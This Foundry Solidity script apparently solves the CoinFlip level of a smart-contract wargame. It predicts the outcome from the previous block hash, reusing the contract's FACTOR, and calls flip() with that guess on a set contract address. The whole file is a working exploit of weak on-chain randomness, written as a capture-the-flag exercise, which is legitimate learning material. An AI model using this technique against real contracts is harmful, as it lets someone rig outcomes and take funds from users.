// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../levels/level03.sol";
import "forge-std/console.sol";

contract MyScript is Script {
   
    CoinFlip public coinFlipInstance = CoinFlip(0xFf788375B09b92DeAaD162fC93F7373BE61b1Ba2);
    
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        console.log("Before Consecutive Wins:", coinFlipInstance.consecutiveWins());
        
        
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = coinFlipInstance.flip(side);

        console.log("The result of the call is ", result);
        console.log("Consecutive Wins:", coinFlipInstance.consecutiveWins());
        
        vm.stopBroadcast();
    }
}